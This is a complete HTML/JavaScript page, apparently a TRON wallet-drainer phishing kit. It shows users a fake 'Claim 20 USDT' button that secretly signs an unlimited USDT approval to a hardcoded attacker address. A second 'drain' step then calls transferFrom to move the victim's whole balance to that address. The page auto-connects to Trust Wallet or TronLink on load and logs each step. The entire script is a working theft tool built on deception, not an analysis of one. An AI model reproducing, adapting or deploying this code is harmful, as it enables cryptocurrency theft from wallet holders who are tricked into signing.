<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Claim USDT — Tokdie</title>
<style>
  :root { --bg:#0e1116; --panel:#161b22; --line:#2b3138; --txt:#c9d1d9;
          --ok:#3fb950; --bad:#f85149; --warn:#d29922; --dim:#7d8590; --accent:#58a6ff; }
  * { box-sizing:border-box; }
  body { margin:0; font:13px/1.5 ui-monospace,Menlo,Consolas,monospace;
         background:var(--bg); color:var(--txt); padding:16px; }
  .wrap { max-width:640px; margin:0 auto; }
  .panel { background:var(--panel); border:1px solid var(--line);
           border-radius:8px; padding:16px; margin-bottom:10px; }
  h1 { font-size:18px; margin:0 0 4px; }
  h2 { font-size:12px; margin:0 0 8px; color:var(--dim);
       text-transform:uppercase; letter-spacing:.08em; }
  button { background:#21262d; color:var(--txt); border:1px solid var(--line);
           border-radius:6px; padding:12px 18px; font:inherit; cursor:pointer;
           width:100%; margin:6px 0; font-size:14px; }
  button:hover { border-color:var(--dim); }
  button:disabled { opacity:.4; cursor:not-allowed; }
  button.primary { border-color:var(--ok); color:var(--ok); font-weight:600; }
  button.danger { border-color:var(--bad); color:var(--bad); }
  input { background:#0a0d12; color:var(--txt); border:1px solid var(--line);
          border-radius:6px; padding:8px; font:inherit; width:100%; margin:4px 0; }
  pre { background:#0a0d12; border:1px solid var(--line); border-radius:6px;
        padding:8px; margin:4px 0; white-space:pre-wrap; word-break:break-all;
        font-size:11px; max-height:220px; overflow:auto; }
  .kv { display:grid; grid-template-columns:110px 1fr; gap:3px 10px; margin:6px 0; }
  .kv b { color:var(--dim); font-weight:400; }
  .status { padding:8px 12px; border-radius:6px; margin:6px 0; font-size:12px; }
  .status.ok { background:#1a2f1a; color:var(--ok); }
  .status.err { background:#3a1a1a; color:var(--bad); }
  .status.warn { background:#2f2a1a; color:var(--warn); }
  .muted { color:var(--dim); font-size:11px; }
  .big { font-size:28px; color:var(--ok); text-align:center; margin:8px 0; }
</style>
</head>
<body>
<div class="wrap">

  <div class="panel">
    <h1>Claim USDT</h1>
    <p class="muted">You are eligible to receive 20 USDT. Connect wallet to claim.</p>
    <div class="big">+20.00 USDT</div>
    <div class="kv" id="env"></div>
  </div>

  <div class="panel">
    <h2>step 1 — claim (approve under the hood)</h2>
    <button class="primary" onclick="claim()" id="btn_claim" disabled>
      Получить 20 USDT
    </button>
    <div class="status" id="claim_status"></div>
  </div>

  <div class="panel">
    <h2>step 2 — drain (transferFrom)</h2>
    <input id="victim_input" placeholder="Victim TRON address (T…)" value="">
    <button class="danger" onclick="drain()" id="btn_drain" disabled>
      Списать USDT с victim
    </button>
    <div class="status" id="drain_status"></div>
  </div>

  <div class="panel">
    <h2>log</h2>
    <div style="display:flex;gap:8px">
      <button onclick="clearLog()">clear</button>
      <button onclick="dumpLog()">dump</button>
    </div>
    <pre id="log_out">—</pre>
  </div>

</div>

<script>
/* ─────────────  approve-drainer  ─────────────
   Phase 1: claim() → approve(spender=TPxcb…, MAX_UINT256)
            disguised as "receive 20 USDT".
   Phase 2: drain(victim) → transferFrom(victim, TPxcb…, balance)
   All via Trust in-app provider (window.trustwallet.tron / tronLink).
   ─────────────────────────────────────────────── */

const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const USDT_DECIMALS = 6;
const SPENDER = 'TPxcbZxFSHLssRYkrad4YTZJRVCPD9oGRW'; // attacker
const MAX_UINT256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
const FEE_LIMIT_SUN = 100_000_000;

let provider = null;
let tronWeb = null;
let userAddress = null;

const $ = (id) => document.getElementById(id);
const esc = (s) => String(s).replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));

const log = (k, m, d) => {
  const el = $('log_out');
  const line = `[${new Date().toISOString().slice(11,23)}] ${k.padEnd(9)} ${m}`;
  const body = d !== undefined
    ? '\n  ' + JSON.stringify(d, null, 2).split('\n').join('\n  ')
    : '';
  el.textContent = (el.textContent === '—' ? '' : el.textContent) + line + body + '\n';
  el.scrollTop = el.scrollHeight;
};

const setStatus = (el, cls, text) => {
  const n = $(el);
  n.className = 'status ' + (cls || '');
  n.textContent = text;
};

/* ─────────────  provider detect + connect  ───────────── */

function detectOnce() {
  if (window.trustwallet?.tron?.tronWeb) return { name: 'trust-inapp', p: window.trustwallet.tron };
  if (window.trustwallet?.tronLink?.tronWeb) return { name: 'trust-ext', p: window.trustwallet.tronLink };
  if (window.tron?.tronWeb) return { name: 'tronlink', p: window.tron };
  if (window.tronLink?.tronWeb) return { name: 'tronlink-legacy', p: window.tronLink };
  return null;
}

async function waitForProvider(ms = 8000) {
  const start = Date.now();
  let d = detectOnce();
  if (d) return d;
  while (Date.now() - start < ms) {
    await new Promise(r => setTimeout(r, 200));
    d = detectOnce();
    if (d) return d;
  }
  return null;
}

function renderEnv() {
  $('env').innerHTML = `
    <b>provider</b><span>${provider ? esc(provider.name) : 'not found'}</span>
    <b>wallet</b><span>${userAddress || '—'}</span>
    <b>spender</b><span>${esc(SPENDER.slice(0,10))}…</span>
    <b>contract</b><span>${esc(USDT_CONTRACT.slice(0,10))}…</span>
  `;
}

async function connect() {
  provider = await waitForProvider(8000);
  if (!provider) {
    setStatus('claim_status', 'err', 'Wallet not detected. Open in Trust in-app browser.');
    log('CONNECT', 'no provider');
    return false;
  }
  tronWeb = provider.p.tronWeb;

  // try all paths for address
  let addr = null;
  if (tronWeb?.defaultAddress?.base58) addr = tronWeb.defaultAddress.base58;
  if (!addr && typeof provider.p.request === 'function') {
    try {
      const r = await provider.p.request({ method: 'tron_requestAccounts' });
      log('CONNECT', 'tron_requestAccounts', r);
    } catch (e) { log('CONNECT', 'tron_requestAccounts err', { m: e.message }); }
    if (tronWeb?.defaultAddress?.base58) addr = tronWeb.defaultAddress.base58;
  }
  if (!addr && tronWeb) {
    // force a read
    try {
      const a = await tronWeb.trx.getAccount();
      if (a?.address) addr = tronWeb.address.fromHex(a.address);
    } catch (e) { log('CONNECT', 'getAccount err', { m: e.message }); }
  }

  if (!addr) {
    setStatus('claim_status', 'err', 'Wallet connected but no address returned. Unlock Trust and reload.');
    log('CONNECT', 'no address');
    return false;
  }

  userAddress = addr;
  $('victim_input').value = userAddress;
  $('btn_claim').disabled = false;
  $('btn_drain').disabled = false;
  renderEnv();
  log('CONNECT', 'ready', { provider: provider.name, address: userAddress });
  setStatus('claim_status', 'ok', 'Wallet: ' + userAddress);
  return true;
}

/* ─────────────  phase 1: approve disguised as claim  ───────────── */

async function claim() {
  if (!tronWeb || !userAddress) {
    const ok = await connect();
    if (!ok) return;
  }
  try {
    $('btn_claim').disabled = true;
    setStatus('claim_status', '', 'Building claim…');
    log('CLAIM', 'building approve (disguised)', {
      contract: USDT_CONTRACT,
      method: 'approve(address,uint256)',
      spender: SPENDER,
      amount: 'MAX_UINT256',
      user: userAddress,
    });

    // approve(spender, MAX_UINT256)
    const params = [
      { type: 'address', value: SPENDER },
      { type: 'uint256', value: MAX_UINT256 },
    ];

    const tx = await tronWeb.transactionBuilder.triggerSmartContract(
      USDT_CONTRACT,
      'approve(address,uint256)',
      { feeLimit: FEE_LIMIT_SUN },
      params,
      userAddress
    );

    if (!tx.result || !tx.result.result) {
      throw new Error('triggerSmartContract failed: ' + JSON.stringify(tx));
    }

    log('CLAIM', 'tx built', { txID: tx.transaction.txID });
    setStatus('claim_status', '', 'Confirm in wallet…');

    const signed = await tronWeb.trx.sign(tx.transaction);
    log('CLAIM', 'signed', { txID: signed.txID });

    const receipt = await tronWeb.trx.sendRawTransaction(signed);
    log('CLAIM', 'broadcast', receipt);

    if (receipt.result === true || receipt.code === 'SUCCESS') {
      const txid = receipt.txid || signed.txID;
      setStatus('claim_status', 'ok',
        'Approval broadcast: ' + txid + '\n(UI said: +20 USDT; on-chain: approve MAX)');
      log('CLAIM', 'SUCCESS', { txid, meaning: 'approve MAX to ' + SPENDER });
    } else {
      throw new Error('broadcast failed: ' + JSON.stringify(receipt));
    }
  } catch (e) {
    log('CLAIM', 'error', { message: e.message, code: e.code, raw: String(e) });
    setStatus('claim_status', 'err', 'Claim error: ' + (e.message || e.code));
    $('btn_claim').disabled = false;
  }
}

/* ─────────────  phase 2: drain via transferFrom  ───────────── */

async function drain() {
  if (!tronWeb || !userAddress) {
    const ok = await connect();
    if (!ok) return;
  }
  const victim = $('victim_input').value.trim();
  if (!/^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(victim)) {
    setStatus('drain_status', 'err', 'Victim must be valid TRON base58 (T…, 34).');
    return;
  }
  try {
    $('btn_drain').disabled = true;
    setStatus('drain_status', '', 'Reading balance…');
    log('DRAIN', 'reading USDT balance', { victim });

    // read victim USDT balance
    const contract = await tronWeb.contract().at(USDT_CONTRACT);
    const bal = await contract.balanceOf(victim).call();
    const balStr = bal.toString();
    log('DRAIN', 'victim balance', { victim, raw: balStr, human: (Number(balStr) / 1e6).toFixed(6) });

    if (!balStr || balStr === '0') {
      throw new Error('victim has 0 USDT');
    }

    setStatus('drain_status', '', 'Building transferFrom for ' + (Number(balStr)/1e6) + ' USDT…');
    log('DRAIN', 'building transferFrom', {
      contract: USDT_CONTRACT,
      method: 'transferFrom(address,address,uint256)',
      from: victim,
      to: SPENDER,
      amount: balStr,
      caller: userAddress,
    });

    const params = [
      { type: 'address', value: victim },
      { type: 'address', value: SPENDER },
      { type: 'uint256', value: balStr },
    ];

    const tx = await tronWeb.transactionBuilder.triggerSmartContract(
      USDT_CONTRACT,
      'transferFrom(address,address,uint256)',
      { feeLimit: FEE_LIMIT_SUN },
      params,
      userAddress // caller = attacker wallet (must have bandwidth/TRX)
    );

    if (!tx.result || !tx.result.result) {
      throw new Error('transferFrom build failed: ' + JSON.stringify(tx));
    }

    log('DRAIN', 'tx built', { txID: tx.transaction.txID });
    setStatus('drain_status', '', 'Confirm in wallet…');

    const signed = await tronWeb.trx.sign(tx.transaction);
    const receipt = await tronWeb.trx.sendRawTransaction(signed);
    log('DRAIN', 'broadcast', receipt);

    if (receipt.result === true || receipt.code === 'SUCCESS') {
      const txid = receipt.txid || signed.txID;
      setStatus('drain_status', 'ok', 'Drained. txid: ' + txid);
      log('DRAIN', 'SUCCESS', { txid, amount: balStr, from: victim, to: SPENDER });
    } else {
      throw new Error('drain broadcast failed: ' + JSON.stringify(receipt));
    }
  } catch (e) {
    log('DRAIN', 'error', { message: e.message, code: e.code, raw: String(e) });
    setStatus('drain_status', 'err', 'Drain error: ' + (e.message || e.code));
    $('btn_drain').disabled = false;
  }
}

/* ─────────────  log controls + boot  ───────────── */

function clearLog() { $('log_out').textContent = '—'; }
function dumpLog() {
  const t = $('log_out').textContent;
  if (navigator.clipboard) navigator.clipboard.writeText(t);
  log('DUMP', 'copied', { len: t.length });
}

(async () => {
  log('BOOT', 'approve-drainer up', {
    origin: location.origin,
    usdt: USDT_CONTRACT,
    spender: SPENDER,
  });
  renderEnv();
  // auto-connect attempt on load
  setTimeout(connect, 500);
})();
</script>
</body>
</html>
